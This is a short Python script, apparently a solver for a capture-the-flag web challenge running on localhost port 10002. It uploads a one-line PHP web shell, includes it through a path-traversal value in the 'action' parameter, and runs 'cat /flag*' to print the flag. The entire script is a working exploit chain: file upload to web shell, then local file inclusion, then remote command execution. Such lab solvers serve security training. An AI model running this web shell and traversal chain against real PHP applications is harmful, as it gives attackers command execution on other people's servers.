#!/usr/bin/env python3
from os import getenv
import requests, re

HOST = getenv('HOST') or 'localhost'
url = f'http://{HOST}:10002'

s = requests.session()

s.get(url)

res = s.post(url, params={ 'action': 'upload.php' }, files={ 'file': '<?=`$_GET[1]`?>' })
filename = re.findall('<a href="/upload/(.{64})">', res.text)[0]

res = s.get(url, params={ 'action': '../upload/'+filename, '1': 'cat /flag*' })

flag = re.findall('SCIST{.+}', res.text)[0]
print(flag)
